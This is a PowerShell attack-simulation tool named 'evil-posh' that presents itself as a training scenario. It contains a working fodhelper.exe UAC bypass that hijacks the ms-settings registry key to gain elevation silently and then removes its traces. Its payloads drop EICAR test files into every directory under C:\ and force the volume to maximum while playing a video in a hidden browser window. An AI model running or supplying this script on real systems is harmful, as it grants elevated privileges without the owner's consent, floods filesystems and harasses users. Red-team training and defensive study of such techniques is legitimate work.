Clear-Host
$scriptPath = $PSScriptRoot
Import-Module "$($scriptPath)\lib\Write-Ascii.psm1"

$global:Payload = 0
$global:Path = "C:\"
$global:Persist = 0

$nuke = {
    # $global:Path = [Environment]::GetFolderPath("MyDocuments")
    $enum = Get-ChildItem -Recurse -Directory $global:Path
    foreach($dir in $enum){
        Write-Host "Found directory.." $dir
        $name = Get-Random
        [string] $EncodedEicar = 'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo='
        [byte[]] $EicarBytes = [System.Convert]::FromBase64String($EncodedEicar)
        [string] $Eicar = [System.Text.Encoding]::UTF8.GetString($EicarBytes)
        [string] $FilePath = New-Item -Path (Join-Path $dir $name) -ItemType File -Force
        Set-Content -Value $Eicar -Encoding ascii -Path $FilePath -Force
        Write-Host "Wrote " $name " to " $dir
    }
}

$enum = {
    $enum = Get-ChildItem -Recurse -Directory $global:Path
        foreach($dir in $enum){
            $i++
        }
        Write-Host "`nFound " $i " directories"
        Start-Sleep 2
        Clear-Host
}

$whale = {
    Param (
            [Parameter(Mandatory = $False, Position = 0)]
            [ValidateNotNullOrEmpty()]
            [String] $VideoURL = "https://www.youtube.com/watch?v=ZJT5qK_S_Ig"
        )
        
        Function Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50 | % {$wshShell.SendKeys([char]174)};1..$Volume | % {$wshShell.SendKeys([char]175)}}
            Set-Speaker -Volume 50   
            $IEComObject = New-Object -com "InternetExplorer.Application"
            $IEComObject.visible = $False
            $IEComObject.navigate($VideoURL)
            Start-Sleep -s 5
            $EndTime = (Get-Date).addseconds(90)
            do {
            $WscriptObject = New-Object -com wscript.shell
            $WscriptObject.SendKeys([char]175)
        }
        until ((Get-Date) -gt $EndTime)
}

Function Show-Menu {
    param(
        [string]$Title = "Main Menu"
    )
    Write-Ascii "evil-posh"
    Write-Host "`nTraining scenario powershell execution examples`n"
    Write-Host $PSCommandPath
    Write-Host "`n====================== $Title ======================="
    Write-Host "BYPASS - Attempt to launch tool as administrator without UAC prompt"
    Write-Host "PATH - Set main path to execute directory based payloads against (Defaults to 'C:\')"
    Write-Host "PAYLOAD - Set payload type"
    Write-Host "EXECUTE - Run the combination of parameters set"
    Write-Host "PERSIST - Choose your persistence mechanism"
    Write-Host "EXIT" 
}

Function Set-Path{
    $global:Path = Read-Host "PATH"
    Write-Host "PATH set to " $global:Path
    Start-Sleep 2
    Clear-Host
}

Function Set-Payload{
    Write-Host `n"PAYLOAD OPTIONS:`nENUM - List out directories and subdirectories from the base (PATH)`nNUKE - Drop an EICAR file in every directory and subdirectory from base (PATH)`nWHALE - Set system volum to MAX and play Narwhales 10 hour in a hidden window"
    $global:PayloadChoice = Read-Host "`nCHOICE"
    if($global:PayloadChoice -eq 'ENUM'){
        $global:Payload = 1
    } elseif($global:PayloadChoice -eq 'BACK'){
        clear-host
        return
    } elseif($global:PayloadChoice -eq 'NUKE'){
        $global:Payload = 2
    } elseif($global:PayloadChoice -eq 'WHALE'){
        $global:Payload = 3
    }else {
        Write-Host "Not a valid option"
        return
    }
    Write-Host "Payload set to " $global:PayloadChoice
    Start-Sleep 3
    Clear-Host
}

Function Start-Payload{
    if($global:Payload -eq 1){
        Invoke-Command -ScriptBlock $enum
    }
    elseif($global:Payload -eq 2){
        Invoke-Command -ScriptBlock $nuke
    } elseif($global:Payload -eq 3){
        Invoke-Command -ScriptBlock $whale
    } else {
        Clear-Host
        Write-Host "An invalid option was provided!"
        Start-Sleep 2
        return
    }
}

Function Start-Bypass{
    Clear-Host
    [String]$program = "cmd /c start powershell.exe -noprofile " + $PSCommandPath
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
    Exit
}

do{
    Show-Menu
    $input = Read-Host "["
    switch($input){
        'PATH' {
            Set-Path
        }
        'PAYLOAD' {
            Set-Payload
        }
        'EXECUTE' {
            Start-Payload
        }
        'BYPASS' {
            Start-Bypass
        }
    }
}
until($input -eq 'EXIT')